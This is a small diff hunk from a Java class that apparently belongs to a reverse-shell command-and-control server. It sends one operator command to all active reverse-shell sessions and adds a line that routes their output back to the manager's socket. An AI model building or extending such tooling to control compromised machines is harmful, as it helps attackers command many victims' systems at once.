@@ -40,6 +40,8 @@ public class AllSendCommand implements Command {
         String mangerMessage = DataManipulationUtil.joinListWithDelimiter(args," ");
         DefualtConnectedCommand defualtConnectedCommand = new DefualtConnectedCommand();
         String uuid = UUID.randomUUID().toString();
+        ConnectionManager.rerouteAllCommandToMangerSession.put(uuid,currentSocket);
+
         for (WebSocketSession activeReverseShellSession : ConnectionManager.activeReverseShellSessions) {
             defualtConnectedCommand.sendCommandToShell( mangerMessage , activeReverseShellSession, currentSocket, uuid);
         }
